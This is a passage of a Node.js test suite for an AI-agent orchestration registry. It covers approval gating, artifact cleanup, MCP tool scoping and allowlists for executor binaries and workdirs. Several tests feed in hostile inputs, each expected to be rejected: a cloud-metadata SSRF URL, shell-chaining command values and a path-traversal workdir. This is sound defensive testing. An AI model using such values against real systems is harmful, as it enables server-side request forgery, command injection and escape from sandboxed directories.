import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { OrcaRegistry } from '../src/registry.js';

// Portable MCP config path for command-arg assertions (no hardcoded /tmp).
const MCP_CONFIG_PATH = path.join(os.tmpdir(), 'orca-mcp.json');

async function withIsolatedRegistry() {
  const previousCwd = process.cwd();
  const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'orca-registry-test-'));
  process.chdir(tempDir);

  const registry = new OrcaRegistry();
  const cleanup = async () => {
    if (typeof registry.drainPendingWrites === 'function') {
      await registry.drainPendingWrites();
    }
    registry.stopScheduler();
    if (typeof registry.drainPendingWrites === 'function') {
      await registry.drainPendingWrites();
    }
    await new Promise((resolve) => setTimeout(resolve, 10));
    process.chdir(previousCwd);
    await fs.rm(tempDir, { force: true, recursive: true, maxRetries: 5, retryDelay: 25 });
  };

  return { registry, cleanup, tempDir };
}

function restoreEnv(previous) {
  const snapshot = { ...previous };
  return () => {
    Object.keys(process.env).forEach((key) => {
      if (!(key in snapshot)) {
        delete process.env[key];
      }
    });
    Object.entries(snapshot).forEach(([key, value]) => {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    });
  };
}

test('cleanup schedule and cleanup artifacts use retention + approval', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    assert.equal(registry.getCleanupSchedule().enabled, false);
    assert.throws(() => registry.updateCleanupSchedule({ enabled: true, intervalHours: 999 }, { approved: true }), (error) => error.status === 422);

    const updated = registry.updateCleanupSchedule({
      enabled: true,
      intervalHours: 12,
      olderThanDays: 7,
      sessionId: null,
      dryRun: true,
    }, { approved: true });
    assert.equal(updated.enabled, true);
    assert.equal(updated.intervalHours, 12);
    assert.equal(updated.olderThanDays, 7);

    const project = registry.createProject({ name: 'Cleanup Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Cleanup Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'old lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });

    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date(Date.now() - (12 * 24 * 60 * 60 * 1000)).toISOString();
    target.updatedAt = target.completedAt;

    const artifactDir = path.join(process.cwd(), 'artifacts', session.id, target.id);
    await fs.mkdir(artifactDir, { recursive: true });
    await fs.writeFile(path.join(artifactDir, 'evidence-test.log'), 'hello');

    const dryRunSummary = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      dryRun: true,
      sessionId: session.id,
      olderThanDays: 10,
    });
    assert.equal(dryRunSummary.dryRun, true);
    assert.equal(dryRunSummary.candidates, 1);
    assert.equal(dryRunSummary.removed, 0);

    const deleteSummary = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      sessionId: session.id,
      olderThanDays: 10,
      dryRun: false,
      confirmed: true,
    });
    assert.equal(deleteSummary.removed, 1);

    await assert.rejects(
      fs.access(path.join(artifactDir, 'evidence-test.log')),
      (error) => error.code === 'ENOENT',
    );
  } finally {
    await cleanup();
  }
});

test('updateLaneControls lets user or agent set targetUrl + verificationCommand (and validates the URL)', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Controls Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Controls Session' }, { actor: 'test', approved: true });
    // User leaves targetUrl + verificationCommand blank at create time.
    const lane = registry.createLane(session.id, { title: 'work', executorType: 'mock' }, { approved: true, actor: 'test' });
    assert.equal(registry.getLane(lane.id).targetUrl, '');
    assert.equal(registry.getLane(lane.id).verificationCommand, '');

    // An agent later learns and writes them back via the controls path.
    const updated = registry.updateLaneControls(lane.id, {
      targetUrl: 'http://localhost:5173',
      verificationCommand: 'npm run smoke',
    }, { actor: 'executor', approved: true });
    assert.equal(updated.targetUrl, 'http://localhost:5173/');
    assert.equal(updated.verificationCommand, 'npm run smoke');

    // A bad / SSRF-y URL is rejected, leaving the lane unchanged.
    assert.throws(
      () => registry.updateLaneControls(lane.id, { targetUrl: 'http://169.254.169.254/latest' }, { actor: 'executor', approved: true }),
      (error) => error.status === 422 || error.status === 400,
    );
  } finally {
    await cleanup();
  }
});

test('project and session mutations require policy approval', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    assert.throws(
      () => registry.createProject({ name: 'Unapproved Project' }),
      (error) => error.status === 409,
    );

    const project = registry.createProject({ name: 'Project with approval' }, { actor: 'test', approved: true });
    assert.equal(project.name, 'Project with approval');

    assert.throws(
      () => registry.createSession(project.id, { name: 'Unapproved Session' }),
      (error) => error.status === 409,
    );

    const session = registry.createSession(project.id, { name: 'Approved Session' }, { actor: 'test', approved: true });
    assert.equal(session.name, 'Approved Session');

    assert.throws(
      () => registry.updateProject(project.id, { name: 'No approval update' }),
      (error) => error.status === 409,
    );

    const renamed = registry.updateProject(project.id, { name: 'Renamed Project' }, { actor: 'test', approved: true });
    assert.equal(renamed.name, 'Renamed Project');
  } finally {
    await cleanup();
  }
});

test('scheduled cleanup tick runs artifacts cleanup when run-at is due', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Scheduled Cleanup Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Scheduled Cleanup Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'stale lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });

    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date(Date.now() - (10 * 24 * 60 * 60 * 1000)).toISOString();
    target.updatedAt = target.completedAt;

    const artifactDir = path.join(process.cwd(), 'artifacts', session.id, target.id);
    await fs.mkdir(artifactDir, { recursive: true });
    await fs.writeFile(path.join(artifactDir, 'evidence-test.log'), 'hello');

    const schedule = registry.updateCleanupSchedule({
      enabled: true,
      intervalHours: 0.001,
      olderThanDays: 1,
      sessionId: session.id,
      dryRun: false,
    }, { actor: 'test', approved: true });
    assert.equal(schedule.enabled, true);

    registry.cleanupSchedule.nextRunAt = new Date(Date.now() - 1000).toISOString();

    await registry.runCleanupSchedulerTick();

    await assert.rejects(
      fs.access(artifactDir),
      (error) => error.code === 'ENOENT',
    );

    const updatedSchedule = registry.getCleanupSchedule();
    assert.equal(updatedSchedule.lastRunAt !== null, true);
    assert.equal(updatedSchedule.nextRunAt !== schedule.nextRunAt, true);
  } finally {
    await cleanup();
  }
});

test('scheduled cleanup tick waits until next run time', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Scheduled Cleanup Holdoff Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Scheduled Cleanup Holdoff Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'stale lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });

    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date(Date.now() - (10 * 24 * 60 * 60 * 1000)).toISOString();
    target.updatedAt = target.completedAt;

    const artifactDir = path.join(process.cwd(), 'artifacts', session.id, target.id);
    await fs.mkdir(artifactDir, { recursive: true });
    await fs.writeFile(path.join(artifactDir, 'evidence-test.log'), 'hello');

    const schedule = registry.updateCleanupSchedule({
      enabled: true,
      intervalHours: 4,
      olderThanDays: 1,
      sessionId: session.id,
      dryRun: false,
    }, { actor: 'test', approved: true });

    registry.cleanupSchedule.nextRunAt = new Date(Date.now() + 60 * 60 * 1000).toISOString();

    await registry.runCleanupSchedulerTick();

    const stillThere = await fs.readdir(artifactDir);
    assert.equal(stillThere.length, 1);
    assert.equal(schedule.lastRunAt, null);
  } finally {
    await cleanup();
  }
});

test('cleanup artifacts and cleanup schedule require approval for manual invocation', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    await assert.rejects(
      () => registry.cleanupArtifacts({
        actor: 'dashboard',
        approved: false,
        dryRun: true,
        sessionId: null,
      }),
      (error) => error.status === 409,
    );

    assert.throws(
      () => registry.updateCleanupSchedule({
        enabled: true,
        intervalHours: 24,
        olderThanDays: 7,
      }, { actor: 'dashboard', approved: false }),
      (error) => error.status === 409,
    );

    const schedulerResult = await registry.cleanupArtifacts({
      actor: 'scheduler',
      skipApproval: true,
      dryRun: true,
      sessionId: null,
      olderThanDays: 7,
    });
    assert.equal(schedulerResult.dryRun, true);
    assert.equal(schedulerResult.removed, 0);
  } finally {
    await cleanup();
  }
});

test('cleanup artifacts require explicit confirmation for destructive cleanup', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Cleanup Confirmation Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Cleanup Confirmation Session' }, { actor: 'test', approved: true });

    const lane = registry.createLane(session.id, {
      title: 'old lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });

    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date(Date.now() - (12 * 24 * 60 * 60 * 1000)).toISOString();
    target.updatedAt = target.completedAt;

    const artifactDir = path.join(process.cwd(), 'artifacts', session.id, target.id);
    await fs.mkdir(artifactDir, { recursive: true });
    await fs.writeFile(path.join(artifactDir, 'evidence-test.log'), 'hello');

    await assert.rejects(
      () => registry.cleanupArtifacts({
        actor: 'test',
        approved: true,
        dryRun: false,
        sessionId: session.id,
        olderThanDays: 10,
      }),
      (error) => error.status === 409,
    );

    const dryRunSummary = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      dryRun: true,
      sessionId: session.id,
      olderThanDays: 10,
    });
    assert.equal(dryRunSummary.removed, 0);

    const deleteSummary = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      dryRun: false,
      confirmed: true,
      sessionId: session.id,
      olderThanDays: 10,
    });
    assert.equal(deleteSummary.removed, 1);
    await assert.rejects(
      fs.access(path.join(artifactDir, 'evidence-test.log')),
      (error) => error.code === 'ENOENT',
    );
  } finally {
    await cleanup();
  }
});

test('cleanup default retention comes from session policy when olderThanDays is omitted', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Retention Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Retention Session',
      artifactRetentionDays: 5,
    }, { actor: 'test', approved: true });

    const lane = registry.createLane(session.id, {
      title: 'old lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });

    const target = registry.getLane(lane.id);
    target.state = 'done';
    target.completedAt = new Date(Date.now() - (6 * 24 * 60 * 60 * 1000)).toISOString();
    target.updatedAt = target.completedAt;

    const artifactDir = path.join(process.cwd(), 'artifacts', session.id, target.id);
    await fs.mkdir(artifactDir, { recursive: true });
    await fs.writeFile(path.join(artifactDir, 'old.txt'), 'retention-check');

    const summaryDefaultRetention = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      sessionId: session.id,
      confirmed: true,
    });
    assert.equal(summaryDefaultRetention.removed, 1);
    await assert.rejects(
      fs.access(path.join(artifactDir, 'old.txt')),
      (error) => error.code === 'ENOENT',
    );

    const keptLane = registry.createLane(session.id, {
      title: 'newer lane',
      executorType: 'mock',
    }, { approved: true, actor: 'test' });
    const keptTarget = registry.getLane(keptLane.id);
    keptTarget.state = 'done';
    keptTarget.completedAt = new Date().toISOString();
    keptTarget.updatedAt = keptTarget.completedAt;
    const keptDir = path.join(process.cwd(), 'artifacts', session.id, keptTarget.id);
    await fs.mkdir(keptDir, { recursive: true });
    await fs.writeFile(path.join(keptDir, 'recent.txt'), 'recent');

    const summaryOverride = await registry.cleanupArtifacts({
      actor: 'test',
      approved: true,
      sessionId: session.id,
      olderThanDays: 30,
      confirmed: true,
    });
    assert.equal(summaryOverride.removed, 0);
    const keptFileText = await fs.readFile(path.join(keptDir, 'recent.txt'), 'utf8');
    assert.equal(keptFileText, 'recent');
  } finally {
    await cleanup();
  }
});

test('MCP tools are scoped by executor type', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'MCP Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'MCP Session' }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'all-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'codex-tool',
      command: 'node',
      args: ['--version'],
      scope: ['codex'],
      enabled: true,
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'claude-tool',
      command: 'node',
      args: ['--version'],
      scope: ['claude'],
      enabled: true,
    }, { actor: 'test', approved: true });

    assert.throws(() => registry.createLane(session.id, {
      title: 'Codex Lane',
      executorType: 'codex',
      mcpToolIds: ['all-tool', 'codex-tool', 'claude-tool'],
    }, { actor: 'test', approved: true }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Claude Lane',
      executorType: 'claude',
      mcpToolIds: ['all-tool', 'codex-tool', 'claude-tool'],
    }, { actor: 'test', approved: true }), (error) => error.status === 422);

    const codexLane = registry.createLane(session.id, {
      title: 'Codex Lane',
      executorType: 'codex',
      mcpToolIds: ['all-tool', 'codex-tool'],
    }, { actor: 'test', approved: true });

    const claudeLane = registry.createLane(session.id, {
      title: 'Claude Lane',
      executorType: 'claude',
      mcpToolIds: ['all-tool', 'claude-tool'],
    }, { actor: 'test', approved: true });

    const mockLane = registry.createLane(session.id, {
      title: 'Mock Lane',
      executorType: 'mock',
      mcpToolIds: ['all-tool'],
    }, { actor: 'test', approved: true });

    const codexToolNames = new Set((codexLane.mcpTools || []).map((item) => item.name));
    const claudeToolNames = new Set((claudeLane.mcpTools || []).map((item) => item.name));
    const mockToolNames = new Set((mockLane.mcpTools || []).map((item) => item.name));

    assert.ok(codexToolNames.has('all-tool'));
    assert.ok(codexToolNames.has('codex-tool'));
    assert.ok(!codexToolNames.has('claude-tool'));

    assert.ok(claudeToolNames.has('all-tool'));
    assert.ok(claudeToolNames.has('claude-tool'));
    assert.ok(!claudeToolNames.has('codex-tool'));

    assert.deepEqual([...mockToolNames], ['all-tool']);
  } finally {
    await cleanup();
  }
});

test('MCP tools can be queried by scope', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    await registry.createMcpTool({
      name: 'all-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'codex-tool',
      command: 'node',
      args: ['--version'],
      scope: ['codex'],
      enabled: true,
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'claude-tool',
      command: 'node',
      args: ['--version'],
      scope: ['claude'],
      enabled: true,
    }, { actor: 'test', approved: true });

    const allTools = registry.getMcpTools();
    const codexTools = registry.getMcpTools('codex');
    const claudeTools = registry.getMcpTools('claude');

    assert.equal(allTools.length, 3);
    assert.equal(codexTools.length, 2);
    assert.equal(claudeTools.length, 2);
    assert.ok(codexTools.every((tool) => tool.scope.includes('all') || tool.scope.includes('codex')));
    assert.ok(claudeTools.every((tool) => tool.scope.includes('all') || tool.scope.includes('claude')));
  } finally {
    await cleanup();
  }
});

test('Deleting an MCP tool detaches it from existing lane snapshots', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'MCP Snapshot Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'MCP Snapshot Session' }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'transient-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, { actor: 'test', approved: true });

    const transientLane = await registry.createLane(session.id, {
      title: 'Transient Lane',
      executorType: 'mock',
      mcpToolIds: ['transient-tool'],
    }, { actor: 'test', approved: true });

    assert.equal(transientLane.mcpTools.length, 1);

    await registry.deleteMcpTool('transient-tool', { actor: 'test', approved: true });
    const refreshedLane = registry.getLane(transientLane.id);
    assert.equal(refreshedLane.mcpTools.length, 0);
  } finally {
    await cleanup();
  }
});

test('MCP tools can be updated when approved and require approval otherwise', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    await registry.createMcpTool({
      name: 'editable-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, { actor: 'test', approved: true });

    const updated = await registry.updateMcpTool('editable-tool', {
      command: 'npx',
      args: ['foo'],
      scope: ['codex'],
      notes: 'updated via test',
      enabled: false,
    }, { actor: 'test', approved: true });

    assert.equal(updated.command, 'npx');
    assert.deepEqual(updated.args, ['foo']);
    assert.deepEqual(updated.scope, ['codex']);
    assert.equal(updated.notes, 'updated via test');
    assert.equal(updated.enabled, false);

    assert.throws(() => registry.updateMcpTool('editable-tool', {
      command: 'npm',
    }, { actor: 'test', approved: false }), (error) => error.status === 409);
  } finally {
    await cleanup();
  }
});

test('MCP tool validation rejects invalid names and command payloads', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    assert.throws(() => registry.createMcpTool({
        name: 'invalid name',
        command: 'node',
        scope: ['all'],
        enabled: true,
      }, {
        actor: 'test',
        approved: true,
      }), (error) => error.status === 422);

    await registry.createMcpTool({
      name: 'valid-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    });

    assert.throws(() => registry.updateMcpTool('valid-tool', {
        command: 'node || echo boom',
      }, {
        actor: 'test',
        approved: true,
      }), (error) => error.status === 422);

    assert.throws(() => registry.updateMcpTool('valid-tool', {
      scope: ['not-real'],
    }, {
      actor: 'test',
      approved: true,
    }), (error) => error.status === 422);
  } finally {
    await cleanup();
  }
});

test('MCP tool arguments are validated for command safety and length', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  const longArg = 'x'.repeat(300);

  try {
    assert.throws(() => registry.createMcpTool({
      name: 'bad-arg-tool',
      command: 'node',
      args: ['--version', 'foo|bar'],
      scope: ['all'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    }), (error) => error.status === 422);

    await registry.createMcpTool({
      name: 'valid-arg-tool',
      command: 'node',
      args: ['--version'],
      scope: ['all'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    });

    assert.throws(() => registry.updateMcpTool('valid-arg-tool', {
      args: [longArg],
    }, {
      actor: 'test',
      approved: true,
    }), (error) => error.status === 422);
  } finally {
    await cleanup();
  }
});

test('MCP tool validation enforces scope allowlist and single-token command', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    assert.throws(() => registry.createMcpTool({
      name: 'space-command-tool',
      command: 'node script.js',
      scope: ['codex'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    }), (error) => error.status === 422);

    assert.throws(() => registry.createMcpTool({
      name: 'invalid-scope-tool',
      command: 'node',
      scope: ['not-real'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    }), (error) => error.status === 422);

    const created = await registry.createMcpTool({
      name: 'scoped-tool',
      command: 'node',
      scope: ['codex', 'all'],
      enabled: true,
    }, {
      actor: 'test',
      approved: true,
    });
    assert.deepEqual(created.scope.sort(), ['all', 'codex']);
  } finally {
    await cleanup();
  }
});

test('Creating lanes rejects unknown or unauthorized MCP tool IDs', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Lane MCP Policy Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Lane MCP Policy Session' }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'scoped-codex-tool',
      command: 'node',
      scope: ['codex'],
      enabled: true,
      args: ['-v'],
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'scoped-claude-tool',
      command: 'node',
      scope: ['claude'],
      enabled: true,
      args: ['-v'],
    }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'disabled-claude-tool',
      command: 'node',
      scope: ['claude'],
      enabled: false,
      args: ['-v'],
    }, { actor: 'test', approved: true });

    assert.throws(() => registry.createLane(session.id, {
      title: 'Unknown MCP tool',
      executorType: 'codex',
      executorBinary: 'codex',
      mcpToolIds: ['ghost-tool'],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Disallowed MCP tool',
      executorType: 'codex',
      executorBinary: 'codex',
      mcpToolIds: ['scoped-claude-tool'],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Disabled MCP tool',
      executorType: 'codex',
      executorBinary: 'codex',
      mcpToolIds: ['disabled-claude-tool'],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Scope mismatch MCP tool',
      executorType: 'codex',
      executorBinary: 'codex',
      mcpToolIds: ['scoped-claude-tool'],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    const codexLane = await registry.createLane(session.id, {
      title: 'Valid codex with scoped tool',
      executorType: 'codex',
      executorBinary: 'codex',
      mcpToolIds: ['scoped-codex-tool'],
    }, { approved: true, actor: 'test' });
    assert.equal(codexLane.mcpTools.length, 1);
    assert.equal(codexLane.mcpTools[0].id, 'scoped-codex-tool');
  } finally {
    await cleanup();
  }
});

test('MCP tool command allowlist can be enforced via env override', async () => {
  const restore = restoreEnv({
    ORCA_MCP_TOOL_COMMAND_ALLOWLIST: process.env.ORCA_MCP_TOOL_COMMAND_ALLOWLIST,
  });

  try {
    process.env.ORCA_MCP_TOOL_COMMAND_ALLOWLIST = 'node,python';
    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      assert.throws(() => registry.createMcpTool({
        name: 'blocked-tool',
        command: 'bun',
        scope: ['all'],
        enabled: true,
      }, {
        actor: 'test',
        approved: true,
      }), (error) => error.status === 422);

      const allowed = await registry.createMcpTool({
        name: 'allowed-tool',
        command: 'python',
        scope: ['all'],
        enabled: true,
      }, {
        actor: 'test',
        approved: true,
      });
      assert.equal(allowed.command, 'python');
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('first-class CLI lanes accept executor overrides and command payloads', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Executor Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Executor Session',
      leader: 'codex',
    }, { actor: 'test', approved: true });

    const codexLane = registry.createLane(session.id, {
      title: 'Codex Lane',
      executorType: 'codex',
      command: 'codex --version',
      executorBinary: '/usr/bin/codex',
      workdir: process.cwd(),
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });

    const claudeLane = registry.createLane(session.id, {
      title: 'Claude Lane',
      executorType: 'claude',
      command: 'claude --version',
      executorBinary: 'claude',
      workdir: process.cwd(),
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });

    assert.equal(codexLane.executorType, 'codex');
    assert.equal(claudeLane.executorType, 'claude');
    assert.equal(codexLane.command, 'codex --version');
    assert.equal(claudeLane.command, 'claude --version');

    const geminiLane = registry.createLane(session.id, {
      title: 'Gemini CLI Lane',
      executorType: 'gemini-cli',
      command: 'gemini --version',
      executorBinary: 'gemini',
      workdir: process.cwd(),
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });

    const composerLane = registry.createLane(session.id, {
      title: 'Composer CLI Lane',
      executorType: 'composer-cli',
      command: 'cursor-agent --version',
      executorBinary: 'cursor-agent',
      workdir: process.cwd(),
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });

    assert.equal(geminiLane.executorType, 'gemini-cli');
    assert.equal(composerLane.executorType, 'composer-cli');
    assert.equal(geminiLane.command, 'gemini --version');
    assert.equal(composerLane.command, 'cursor-agent --version');
  } finally {
    await cleanup();
  }
});

test('first-class CLI lanes enforce binary/command executor targeting', async () => {
  const { registry, cleanup, tempDir } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Executor Policy Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Executor Policy Session',
      leader: 'codex',
    }, { actor: 'test', approved: true });

    assert.throws(() => registry.createLane(session.id, {
      title: 'Invalid codex command',
      executorType: 'codex',
      command: 'claude --version',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Wrapper codex command',
      executorType: 'codex',
      command: 'env codex --version',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Invalid codex binary',
      executorType: 'codex',
      executorBinary: '/usr/bin/claude',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    const validLane = registry.createLane(session.id, {
      title: 'Valid codex bare binary',
      executorType: 'codex',
      executorBinary: 'codex',
      command: 'codex --help',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(validLane.executorType, 'codex');
    assert.equal(validLane.executorBinary, 'codex');

    assert.throws(() => registry.createLane(session.id, {
      title: 'Relative path codex command',
      executorType: 'codex',
      command: './codex --version',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    const symlinkBinary = path.join(tempDir, 'codex');
    await fs.symlink(process.execPath, symlinkBinary);
    assert.throws(() => registry.createLane(session.id, {
      title: 'Absolute symlink codex binary',
      executorType: 'codex',
      executorBinary: symlinkBinary,
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Invalid gemini command',
      executorType: 'gemini-cli',
      command: 'claude --version',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    assert.throws(() => registry.createLane(session.id, {
      title: 'Invalid composer binary',
      executorType: 'composer-cli',
      executorBinary: '/usr/bin/composer',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);

    const geminiLane = registry.createLane(session.id, {
      title: 'Valid gemini bare binary',
      executorType: 'gemini-cli',
      command: 'gemini --help',
      executorBinary: 'gemini',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(geminiLane.executorType, 'gemini-cli');

    const composerLane = registry.createLane(session.id, {
      title: 'Valid composer bare binary',
      executorType: 'composer-cli',
      command: 'cursor-agent --help',
      executorBinary: 'cursor-agent',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(composerLane.executorType, 'composer-cli');
  } finally {
    await cleanup();
  }
});

test('first-class CLI lanes accept explicitly configured absolute binaries', async () => {
  const previousEnv = { ...process.env };
  const restore = restoreEnv(previousEnv);
  const { registry, cleanup, tempDir } = await withIsolatedRegistry();

  try {
    const configuredBinary = path.join(tempDir, 'bin', 'codex-real');
    await fs.mkdir(path.dirname(configuredBinary), { recursive: true });
    await fs.symlink(process.execPath, configuredBinary);
    process.env.ORCA_CODEX_BINARY = configuredBinary;
    process.env.ORCA_CODEX_ALLOWED_BINARIES = configuredBinary;

    const project = registry.createProject({ name: 'Configured Binary Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Configured Binary Session',
      leader: 'codex',
    }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'Configured absolute codex',
      executorType: 'codex',
      executorBinary: configuredBinary,
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(lane.executorBinary, configuredBinary);

    const { CliExecutorAdapter } = await import('../src/executor/cli-adapter.js');
    const adapter = new CliExecutorAdapter('codex', {
      defaultBinary: configuredBinary,
      allowedBinaries: [configuredBinary],
      defaultWorkingDir: process.cwd(),
      workdirRoots: [process.cwd()],
    });
    assert.equal(adapter._resolveBinary(configuredBinary), configuredBinary);
    assert.throws(
      () => adapter._resolveBinary(path.join(tempDir, 'codex')),
      /not in the approved allowlist/,
    );
  } finally {
    restore();
    await cleanup();
  }
});

test('Creating lanes rejects unsupported executor types', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Executor Type Policy Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Executor Type Policy Session',
      leader: 'codex',
    }, { actor: 'test', approved: true });

    assert.throws(() => registry.createLane(session.id, {
      title: 'Unsupported executor',
      executorType: 'openai-orchestrator',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' }), (error) => error.status === 422);
  } finally {
    await cleanup();
  }
});

test('Lane workdirs default to the session workspace and reject traversal outside session boundary', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Workspace Boundaries Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, {
      name: 'Workspace Boundaries Session',
      leader: 'codex',
    }, { actor: 'test', approved: true });
    const sessionRecord = registry.getSession(session.id);

    const workspaceStats = await fs.stat(sessionRecord.worktreeRoot);
    assert.equal(workspaceStats.isDirectory(), true);

    const defaultLane = registry.createLane(session.id, {
      title: 'Default workspace lane',
      executorType: 'codex',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(defaultLane.workdir, sessionRecord.worktreeRoot);
    const defaultStat = await fs.stat(defaultLane.workdir);
    assert.equal(defaultStat.isDirectory(), true);

    const relativeLane = registry.createLane(session.id, {
      title: 'Relative workspace lane',
      executorType: 'codex',
      workdir: 'feature-run',
      mcpToolIds: [],
    }, { approved: true, actor: 'test' });
    assert.equal(relativeLane.workdir, path.join(sessionRecord.worktreeRoot, 'feature-run'));
    const relativeStat = await fs.stat(relativeLane.workdir);
    assert.equal(relativeStat.isDirectory(), true);

    assert.throws(
      () => registry.createLane(session.id, {
        title: 'Escaping workspace lane',
        executorType: 'codex',
        workdir: '../outside',
        mcpToolIds: [],
